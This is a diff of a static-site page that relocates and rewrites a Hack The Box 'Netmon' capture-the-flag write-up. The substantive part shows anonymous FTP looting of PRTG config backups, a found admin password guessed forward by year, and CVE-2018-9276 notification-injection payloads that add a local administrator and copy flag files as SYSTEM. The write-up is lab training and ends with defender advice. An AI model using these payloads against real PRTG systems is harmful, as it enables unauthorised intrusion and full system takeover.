@@ -6,17 +6,17 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="FTP anonymous access exposes PRTG config files with credentials. Those credentials unlock RCE on a network monitoring tool — and SYSTEM.">
+        <meta name="description" content="FTP anonymous access exposes PRTG config files with stale credentials. Year-mutation unlocks the web UI. CVE-2018-9276 command injection as SYSTEM — flags extracted via FTP after shell access proved unstable.">
       
       
         <meta name="author" content="Fudomaru">
       
       
       
-        <link rel="prev" href="../bash-course-ysap/">
+        <link rel="prev" href="../jerry/">
       
       
-        <link rel="next" href="../../../about/">
+        <link rel="next" href="../../thm/overview/">
       
       
         
@@ -356,11 +356,13 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../../../challenges/overview/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../overview/" class="md-tabs__link">
           
   
   
@@ -396,13 +398,11 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="../../overview/" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../../../notes/overview/" class="md-tabs__link">
           
   
   
@@ -2795,24 +2795,29 @@
       
   
   
+    
   
   
+  
     
     
     
     
-      
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
             
   
   
@@ -2830,7 +2835,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -2848,7 +2853,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/overview/" class="md-nav__link">
+      <a href="../../overview/" class="md-nav__link">
         
   
   
@@ -2926,7 +2931,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/overthewire/bandit/" class="md-nav__link">
+      <a href="../../overthewire/bandit/" class="md-nav__link">
         
   
   
@@ -2954,7 +2959,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/overthewire/natas/" class="md-nav__link">
+      <a href="../../overthewire/natas/" class="md-nav__link">
         
   
   
@@ -2987,6 +2992,8 @@
                 
   
   
+    
+  
   
   
     
@@ -2997,11 +3004,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" checked>
         
           
           <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
@@ -3022,7 +3029,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -3040,7 +3047,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/htb/overview/" class="md-nav__link">
+      <a href="../overview/" class="md-nav__link">
         
   
   
@@ -3068,7 +3075,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/htb/twomillion/" class="md-nav__link">
+      <a href="../twomillion/" class="md-nav__link">
         
   
   
@@ -3096,7 +3103,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/htb/blue/" class="md-nav__link">
+      <a href="../blue/" class="md-nav__link">
         
   
   
@@ -3124,7 +3131,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/htb/jerry/" class="md-nav__link">
+      <a href="../jerry/" class="md-nav__link">
         
   
   
@@ -3140,6 +3147,158 @@
   
 
       </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Netmon
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Netmon
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp-anonymous-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FTP Anonymous Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-discovery-year-mutation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Discovery — Year Mutation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-cve-2018-9276" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation — CVE-2018-9276
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-attempts-what-failed" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell Attempts — What Failed
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-extraction-prtg-as-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag Extraction — PRTG as SYSTEM
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -3210,7 +3369,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/thm/overview/" class="md-nav__link">
+      <a href="../../thm/overview/" class="md-nav__link">
         
   
   
@@ -3238,7 +3397,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../challenges/thm/billing/" class="md-nav__link">
+      <a href="../../thm/billing/" class="md-nav__link">
         
   
   
@@ -3561,29 +3720,24 @@
       
   
   
-    
   
   
-  
     
     
     
     
       
-        
-        
-      
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
         
           
-          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
             
   
   
@@ -3601,7 +3755,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_7">
             <span class="md-nav__icon md-icon"></span>
             
@@ -3619,7 +3773,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../overview/" class="md-nav__link">
+      <a href="../../../notes/overview/" class="md-nav__link">
         
   
   
@@ -3647,7 +3801,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../ccna/" class="md-nav__link">
+      <a href="../../../notes/ccna/" class="md-nav__link">
         
   
   
@@ -3725,7 +3879,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../media/overview/" class="md-nav__link">
+      <a href="../../../notes/media/overview/" class="md-nav__link">
         
   
   
@@ -3753,7 +3907,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../media/how-to-talk-to-anyone/" class="md-nav__link">
+      <a href="../../../notes/media/how-to-talk-to-anyone/" class="md-nav__link">
         
   
   
@@ -3781,7 +3935,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../media/algorithms-to-live-by/" class="md-nav__link">
+      <a href="../../../notes/media/algorithms-to-live-by/" class="md-nav__link">
         
   
   
@@ -3809,7 +3963,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../media/12-rules-for-life/" class="md-nav__link">
+      <a href="../../../notes/media/12-rules-for-life/" class="md-nav__link">
         
   
   
@@ -3845,7 +3999,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../warboard/" class="md-nav__link">
+      <a href="../../../notes/warboard/" class="md-nav__link">
         
   
   
@@ -3870,8 +4024,6 @@
                 
   
   
-    
-  
   
   
     
@@ -3882,11 +4034,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_5" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_5" >
         
           
           <label class="md-nav__link" for="__nav_7_5" id="__nav_7_5_label" tabindex="0">
@@ -3907,7 +4059,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_5_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_5_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_7_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -3925,7 +4077,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bash-course-ysap/" class="md-nav__link">
+      <a href="../../../notes/unfinished/bash-course-ysap/" class="md-nav__link">
         
   
   
@@ -3941,158 +4093,6 @@
   
 
       </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-    
-  
-  
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    HTB Netmon
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    HTB Netmon
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#setup" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Setup
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Enumeration
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ftp-anonymous-access" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        FTP Anonymous Access
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#credential-discovery" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Credential Discovery
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web-application-prtg" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Web Application — PRTG
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation-cve-2018-9276" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Exploitation — CVE-2018-9276
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#flags" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Flags
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -4200,21 +4200,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#credential-discovery" class="md-nav__link">
+  <a href="#credential-discovery-year-mutation" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Credential Discovery
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web-application-prtg" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Web Application — PRTG
+        Credential Discovery — Year Mutation
       
     </span>
   </a>
@@ -4233,10 +4222,21 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#flags" class="md-nav__link">
+  <a href="#shell-attempts-what-failed" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Flags
+        Shell Attempts — What Failed
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-extraction-prtg-as-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag Extraction — PRTG as SYSTEM
       
     </span>
   </a>
@@ -4289,7 +4289,7 @@
         <a href="../../overview/" class="md-path__link">
           
   <span class="md-ellipsis">
-    Notes
+    Challenges
   </span>
 
         </a>
@@ -4304,10 +4304,10 @@
     
     
       <li class="md-path__item">
-        <a href="../bash-course-ysap/" class="md-path__link">
+        <a href="../overview/" class="md-path__link">
           
   <span class="md-ellipsis">
-    Unfinished
+    HTB
   </span>
 
         </a>
@@ -4350,23 +4350,20 @@
 </tbody>
 </table>
 <p>Netmon is a lesson in credential exposure and the danger of default storage locations.
-PRTG Network Monitor — a legitimate network management tool — stores its configuration including credentials in predictable flat files.
-FTP anonymous access hands you the filesystem.
-The rest follows naturally.</p>
-<p>The blue team angle is strong here: PRTG is widely deployed in enterprise environments,
-and this box shows exactly what happens when monitoring infrastructure is itself left unmonitored.</p>
+PRTG Network Monitor stores its configuration — including credentials — in predictable flat files on disk.
+Anonymous FTP hands you the entire filesystem. The credentials in the backup are stale, but one small mutation opens the door.</p>
+<p>The box also taught me that getting a stable shell isn't always necessary. PRTG runs as SYSTEM, and if command injection gives you SYSTEM-level execution, you can read any file on the box without ever landing an interactive session.</p>
 <hr />
 <h2 id="setup">Setup</h2>
-<p>Kali VM via QEMU. VPN config transferred from host via HTTP server, connected with openvpn.
+<p>Kali VM via QEMU. VPN connected with openvpn.
 If large packets time out, lower the MTU on the tunnel interface:</p>
 <div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>tun0<span class="w"> </span>mtu<span class="w"> </span><span class="m">1200</span>
 </code></pre></div>
 <hr />
 <h2 id="enumeration">Enumeration</h2>
-<div class="highlight"><pre><span></span><code>ping<span class="w"> </span>&lt;IP&gt;
-nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span>&lt;IP&gt;
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-vv<span class="w"> </span>-oA<span class="w"> </span>nmap_init<span class="w"> </span>&lt;IP&gt;
 </code></pre></div>
-<p><strong>Open ports to look for:</strong></p>
+<p><strong>Open ports:</strong></p>
 <table>
 <thead>
 <tr>
@@ -4379,7 +4376,7 @@ nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </spa
 <tr>
 <td>21</td>
 <td>ftp</td>
-<td>Anonymous login allowed</td>
+<td>Anonymous login allowed — full C: drive exposed</td>
 </tr>
 <tr>
 <td>80</td>
@@ -4401,69 +4398,88 @@ nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </spa
 <td>microsoft-ds</td>
 <td>SMB</td>
 </tr>
+<tr>
+<td>5985</td>
+<td>wsman</td>
+<td>WinRM</td>
+</tr>
 </tbody>
 </table>
-<p>FTP and HTTP are the two attack surfaces. Start with FTP.</p>
+<p>TTL 127 confirms Windows. Two immediate attack surfaces: FTP (anonymous, no creds needed) and the PRTG web UI on port 80 (needs credentials). FTP first.</p>
 <hr />
 <h2 id="ftp-anonymous-access">FTP Anonymous Access</h2>
-<p>PRTG stores its data under <code>C:\ProgramData\Paessler\PRTG Network Monitor\</code>.
-Anonymous FTP gives access to the full filesystem — navigate there and look for config files.</p>
+<p>Anonymous FTP login is allowed and exposes the full C: drive. PRTG stores its data under:</p>
+<div class="highlight"><pre><span></span><code>C:\ProgramData\Paessler\PRTG Network Monitor\
+</code></pre></div>
 <div class="highlight"><pre><span></span><code>ftp<span class="w"> </span>&lt;IP&gt;
 <span class="c1"># user: anonymous</span>
-<span class="c1"># pass: (blank or any email)</span>
+<span class="c1"># pass: (blank)</span>
 </code></pre></div>
-<p>Files worth pulling:</p>
+<p>Three config files are present:</p>
 <div class="highlight"><pre><span></span><code>PRTG Configuration.dat
 PRTG Configuration.old
 PRTG Configuration.old.bak
 </code></pre></div>
-<p>The <code>.old.bak</code> file is the one that tends to contain credentials in cleartext.
-Download it and search for password fields.</p>
+<p>The <code>.old.bak</code> file is a stale backup and tends to contain credentials in cleartext. Download it:</p>
 <div class="highlight"><pre><span></span><code>get<span class="w"> </span><span class="s2">&quot;PRTG Configuration.old.bak&quot;</span>
 </code></pre></div>
-<hr />
-<h2 id="credential-discovery">Credential Discovery</h2>
-<p>Open the config file and search for credentials:</p>
-<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;password\|user\|admin&quot;</span><span class="w"> </span><span class="s2">&quot;PRTG Configuration.old.bak&quot;</span>
+<p>Search for credentials:</p>
+<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;dbpassword&quot;</span><span class="w"> </span><span class="s2">&quot;PRTG Configuration.old.bak&quot;</span>
 </code></pre></div>
-<p>Note the username and password found.
-Also note: config files often contain outdated credentials.
-Think about what small change might make the old password current — a common pattern is appending the year.</p>
+<p>Found: <code>prtgadmin : PrTg@dmin2018</code></p>
 <hr />
-<h2 id="web-application-prtg">Web Application — PRTG</h2>
-<p>Navigate to <code>http://&lt;IP&gt;</code> and log in with the discovered credentials.
-Confirm which version of PRTG is running — the version number matters for CVE-2018-9276.</p>
-<p>PRTG versions before 18.2.39 are vulnerable to authenticated command injection via the notification system.</p>
+<h2 id="credential-discovery-year-mutation">Credential Discovery — Year Mutation</h2>
+<p>The backup is from 2018. Tried the exact credentials on the PRTG web login — failed.</p>
+<p>This is a common pattern with stale config files: the password was rotated but followed an obvious convention. Tried incrementing the year by one:</p>
+<div class="highlight"><pre><span></span><code>prtgadmin : PrTg@dmin2019
+</code></pre></div>
+<p>That worked. Inside the PRTG dashboard.</p>
+<p><strong>The lesson:</strong> when credentials from a backup fail, think about what small, predictable mutation makes them current — year increment, version number, appended character. Brute-force is a last resort.</p>
 <hr />
 <h2 id="exploitation-cve-2018-9276">Exploitation — CVE-2018-9276</h2>
-<p>PRTG allows admins to run custom notifications. The parameter handling is not properly sanitised —
-a specially crafted notification name can execute arbitrary commands as SYSTEM.</p>
-<p>The exploit path:
-1. Create a new notification under <strong>Setup &gt; Account Settings &gt; Notifications</strong>
-2. Set the notification type to <strong>Execute Program</strong>
-3. Inject a payload into the parameter field</p>
-<p>Common payload: add a new local administrator.</p>
-<div class="highlight"><pre><span></span><code>test.txt;net user &lt;username&gt; &lt;password&gt; /add;net localgroup administrators &lt;username&gt; /add
+<p>PRTG versions before 18.2.39 are vulnerable to authenticated command injection via the notification system. The parameter field passed to the Execute Program notification type is not sanitised — anything after a semicolon runs as a separate command under the PRTG service account, which is <strong>SYSTEM</strong>.</p>
+<p><strong>Path:</strong>
+Setup → Account Settings → Notifications → Add new notification → Execute Program</p>
+<p><strong>Payload to create a local admin user:</strong></p>
+<div class="highlight"><pre><span></span><code>test.txt;net user htb Password123 /add&amp;net localgroup administrators htb /add
 </code></pre></div>
-<p>After triggering the notification (run it), verify the new user exists, then:</p>
-<div class="highlight"><pre><span></span><code>psexec.py<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;IP&gt;<span class="w"> </span>cmd.exe
-<span class="c1"># or</span>
-evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;
-</code></pre></div>
-<p>This should land a shell as SYSTEM or at minimum Administrator.</p>
+<p>After saving, click the bell/play icon next to the notification to trigger it — saving alone does nothing.</p>
+<p><strong>Syntax note:</strong> Windows CMD uses <code>&amp;</code> to chain commands, not <code>;</code>. The <code>;</code> only works as the injection separator into PRTG's parameter handling. The second command must use <code>&amp;</code>.</p>
 <hr />
-<h2 id="flags">Flags</h2>
-<div class="highlight"><pre><span></span><code>type C:\Users\Public\Desktop\user.txt
-type C:\Users\Administrator\Desktop\root.txt
+<h2 id="shell-attempts-what-failed">Shell Attempts — What Failed</h2>
+<p>With the <code>htb</code> local admin account created, tried two routes:</p>
+<p><strong>evil-winrm (port 5985):</strong>
+<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-u<span class="w"> </span>htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password123&#39;</span>
+</code></pre></div>
+The session connected but dropped immediately on the first command with <code>WinRM::WinRMAuthorizationError</code>. The account exists but UAC token filtering strips the elevated token for local accounts over WinRM — the session opens but commands requiring elevation fail.</p>
+<p><strong>impacket-psexec / smbclient (port 445):</strong>
+<div class="highlight"><pre><span></span><code>impacket-psexec<span class="w"> </span>htb:<span class="s1">&#39;Password123&#39;</span>@&lt;IP&gt;
+smbclient<span class="w"> </span>//&lt;IP&gt;/C$<span class="w"> </span>-U<span class="w"> </span>htb%<span class="s1">&#39;Password123&#39;</span>
+</code></pre></div>
+Both returned <code>STATUS_LOGON_FAILURE</code>. This is Windows UAC token filtering for local (non-domain) accounts over SMB — local admins cannot access admin shares like <code>C$</code> remotely unless <code>LocalAccountTokenFilterPolicy</code> is explicitly enabled. No workaround without a working shell first.</p>
+<hr />
+<h2 id="flag-extraction-prtg-as-system">Flag Extraction — PRTG as SYSTEM</h2>
+<p>Since PRTG runs as SYSTEM, the command injection can read any file on the box regardless of ACLs.
+Rather than fighting the shell stability issues, used two more notifications to write the flags to C:\ and retrieved them via FTP.</p>
+<p><strong>Notification 1:</strong>
+<div class="highlight"><pre><span></span><code>test.txt;type &quot;C:\Users\Administrator\Desktop\root.txt&quot; &gt; C:\root_flag.txt
+</code></pre></div></p>
+<p><strong>Notification 2:</strong>
+<div class="highlight"><pre><span></span><code>test.txt;type &quot;C:\Users\Public\Desktop\user.txt&quot; &gt; C:\user_flag.txt
+</code></pre></div></p>
+<p>Trigger both, then retrieve via FTP:</p>
+<div class="highlight"><pre><span></span><code>ftp<span class="w"> </span>&lt;IP&gt;
+<span class="c1"># anonymous login</span>
+get<span class="w"> </span>root_flag.txt
+get<span class="w"> </span>user_flag.txt
 </code></pre></div>
 <p><strong>User flag:</strong> <code>&lt;!-- insert here --&gt;</code></p>
 <p><strong>Root flag:</strong> <code>&lt;!-- insert here --&gt;</code></p>
 <hr />
 <div class="admonition example">
 <p class="admonition-title">Conclusion</p>
-<p>Write this after completing the box.
-Cover: how anonymous FTP became the entry point, why stale config backups are dangerous,
-and what a defender should be looking for — FTP anonymous access alerts, PRTG running as SYSTEM, notification execution logs.</p>
+<p>The attack chain is straightforward but the execution had rough edges. Getting a stable shell never worked — UAC token filtering blocked both SMB admin share access and WinRM command execution for the local account created via command injection. The real insight was recognising that a stable shell isn't always necessary: PRTG runs as SYSTEM, so SYSTEM-level execution was available the whole time through the notification system. Writing the flags to disk and pulling them via anonymous FTP was cleaner than any shell approach would have been.</p>
+<p>Defender takeaways: FTP anonymous access to the full filesystem is the root cause here — remove it. PRTG config backups with plaintext credentials should never sit in a world-readable location. And PRTG running as SYSTEM is a misconfiguration — it needs only service-level privileges. Any one of those three changes breaks the chain.</p>
 </div>
 
 
@@ -4503,7 +4519,7 @@ and what a defender should be looking for — FTP anonymous access alerts, PRTG 
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../bash-course-ysap/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Bash Course (YSAP)">
+          <a href="../jerry/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Jerry">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
@@ -4513,20 +4529,20 @@ and what a defender should be looking for — FTP anonymous access alerts, PRTG 
                 Previous
               </span>
               <div class="md-ellipsis">
-                Bash Course (YSAP)
+                Jerry
               </div>
             </div>
           </a>
         
         
           
-          <a href="../../../about/" class="md-footer__link md-footer__link--next" aria-label="Next: About">
+          <a href="../../thm/overview/" class="md-footer__link md-footer__link--next" aria-label="Next: Overview">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                About
+                Overview
               </div>
             </div>
             <div class="md-footer__button md-icon">
